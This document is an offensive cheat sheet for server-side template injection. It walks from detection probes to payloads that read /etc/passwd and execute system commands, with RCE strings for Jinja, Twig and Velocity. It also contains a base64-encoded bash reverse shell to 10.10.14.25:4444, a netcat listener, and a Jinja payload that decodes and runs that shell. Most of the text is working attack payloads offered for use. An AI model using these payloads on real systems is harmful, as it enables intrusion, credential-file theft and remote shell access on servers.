## Server-Side Template Injection

### Most common payload for detection
```
${7*7}
```

### Step 1: Basic evaluations

```
{{4*4}}
{{7+3}}
```

### Step 2: we can try to retrieve application classes or objects:

``` 
{{ ”.__class__ }}
{{ ”.__class__.__mro__ }}
```

### Step 3: Look for files to read from the server:

```
{{ ‘/etc/passwd’ | read }}
{{ ‘file:///etc/passwd’ | urlize }}
```

### Step 4: Execute system commands:

```
{{ ‘ls’ | shell_exec }}
{{ ‘id’ | system }}
```

### Might need to convert bash shell to base64
```
echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
nc -lvvp 4444
```

### Supplying SSTI payload via the vulnerable parameter
```
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
```


### Jinja (python)

#### Detection
``` 
{{ 7 * 7 }} 
{{ 7 * '7' }} # 7777777 in Jinja2 
{{ config }}
```

#### RCE
```
__import__('os').system('ls')
{{ __import__('os').popen('cat /etc/passwd').read() }}.
```

### Twig (PHP)

#### Detection
```
{{ 7 * 7 }}
{{ 7 * '7' }} # returns 49 in Twig
{{ dump() }}
```
#### RCE
```
{{ dump(system('ls')) }}
```

### Velocity (Java): 

#### Detection
```
#set($foo = "bar")
#parse("exploit.vm").
```

#### RCE
```
#set($ex = new java.lang.ProcessBuilder('ls').start())
```

### SSTI Decision Tree 

![SSTI Decision Tree ](SSTI-DecisionTree.png)